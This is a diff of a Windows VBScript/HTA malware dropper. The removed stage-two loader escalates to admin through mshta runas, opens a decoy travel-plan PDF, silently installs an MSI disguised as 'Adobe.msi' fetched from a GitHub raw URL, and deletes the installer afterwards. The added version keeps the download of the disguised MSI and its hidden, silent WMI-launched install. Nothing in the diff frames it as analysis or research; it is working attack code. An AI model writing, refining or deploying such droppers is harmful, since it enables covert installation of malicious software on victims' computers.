@@ -1,93 +1,45 @@
-Sub Stage2Run()
-    Dim fso, sh, qs, tmp, selfPath, isAdmin
-    Dim http2, stream, msiUrl, msiPath, pid
-    Dim wmiSvc, procClass, startup, cmdLine
-    Dim pdfUrl, pdfPath, ph, ps
+Dim fso, sh, http, msiUrl, msiPath, pid, wmiSvc, procClass, startup, cmdLine, procs, proc
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set sh  = CreateObject("WScript.Shell")
+msiUrl  = "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/Adobe.msi"
+msiPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\a.msi"
 
-    Set fso = CreateObject("Scripting.FileSystemObject")
-    Set sh  = CreateObject("WScript.Shell")
-    qs  = Chr(34)
-    tmp = sh.ExpandEnvironmentStrings("%TEMP%")
+Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
+http.Open "GET", msiUrl, False
+http.Send
 
-    selfPath = location.href
-    selfPath = Replace(selfPath, "file:///", "")
-    selfPath = Replace(selfPath, "%20", " ")
-    selfPath = Replace(selfPath, "/", "\")
+If http.Status = 200 Then
+    Dim stream
+    Set stream = CreateObject("ADODB.Stream")
+    stream.Type = 1
+    stream.Open
+    stream.Write http.ResponseBody
+    stream.SaveToFile msiPath, 2
+    stream.Close
+End If
 
-    isAdmin = True
-    On Error Resume Next
-    sh.RegWrite "HKLM\SOFTWARE\Microsoft\_a", "1", "REG_SZ"
-    If Err.Number <> 0 Then isAdmin = False
-    Err.Clear
-    On Error GoTo 0
-    If isAdmin Then sh.RegDelete "HKLM\SOFTWARE\Microsoft\_a"
+If fso.FileExists(msiPath) Then
+    ' wait for any in-flight msiexec to finish (up to 60s)
+    Dim waited
+    waited = 0
+    Do While waited < 60
+        Dim anyRunning
+        anyRunning = False
+        Set wmiSvc = GetObject("winmgmts:\\.\root\cimv2")
+        Set procs = wmiSvc.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name='msiexec.exe'")
+        For Each proc In procs
+            anyRunning = True
+        Next
+        If Not anyRunning Then Exit Do
+        WScript.Sleep 2000
+        waited = waited + 2
+    Loop
 
-    If Not isAdmin Then
-        CreateObject("Shell.Application").ShellExecute "mshta.exe", qs & selfPath & qs, "", "runas", 1
-        self.close
-        Exit Sub
-    End If
-
-    pdfUrl  = "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/Travel-Meeting-Plan-Q4-2026.pdf"
-    pdfPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Travel-Meeting-Plan-Q4-2026.pdf"
-
-    On Error Resume Next
-    Set ph = CreateObject("WinHttp.WinHttpRequest.5.1")
-    ph.Open "GET", pdfUrl, False
-    ph.Send
-    On Error GoTo 0
-
-    If ph.Status = 200 Then
-        On Error Resume Next
-        Set ps = CreateObject("ADODB.Stream")
-        ps.Type = 1
-        ps.Open
-        ps.Write ph.ResponseBody
-        ps.SaveToFile pdfPath, 2
-        ps.Close
-        On Error GoTo 0
-        If fso.FileExists(pdfPath) Then
-            CreateObject("Shell.Application").ShellExecute pdfPath, "", "", "open", 1
-        End If
-    End If
-
-    msiUrl  = "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/Adobe.msi"
-    msiPath = tmp & "\a.msi"
-
-    On Error Resume Next
-    Set http2 = CreateObject("WinHttp.WinHttpRequest.5.1")
-    http2.Open "GET", msiUrl, False
-    http2.Send
-    On Error GoTo 0
-
-    If http2.Status = 200 Then
-        On Error Resume Next
-        Set stream = CreateObject("ADODB.Stream")
-        stream.Type = 1
-        stream.Open
-        stream.Write http2.ResponseBody
-        stream.SaveToFile msiPath, 2
-        stream.Close
-        On Error GoTo 0
-    End If
-
-    If fso.FileExists(msiPath) Then
-        Set wmiSvc    = GetObject("winmgmts:\\.\root\cimv2")
-        Set procClass = wmiSvc.Get("Win32_Process")
-        Set startup   = wmiSvc.Get("Win32_ProcessStartup").SpawnInstance_
-        startup.ShowWindow = 0
-        cmdLine = "msiexec.exe /i " & qs & msiPath & qs & " /qn+ /norestart ALLUSERS=1"
-        procClass.Create cmdLine, Null, startup, pid
-    End If
-
-    sh.Run "%COMSPEC% /c timeout /t 30 /nobreak >nul", 0, True
-    sh.Run "%COMSPEC% /c timeout /t 60 /nobreak >nul", 0, True
-
-    On Error Resume Next
-    If fso.FileExists(msiPath) Then fso.DeleteFile msiPath, True
-    On Error GoTo 0
-
-    self.close
-End Sub
-
-Stage2Run
+    ' spawn new install via WMI, detached
+    Set wmiSvc    = GetObject("winmgmts:\\.\root\cimv2")
+    Set procClass = wmiSvc.Get("Win32_Process")
+    Set startup   = wmiSvc.Get("Win32_ProcessStartup").SpawnInstance_
+    startup.ShowWindow = 0
+    cmdLine = "msiexec.exe /i " & Chr(34) & msiPath & Chr(34) & " /qn /norestart"
+    procClass.Create cmdLine, Null, startup, pid
+End If
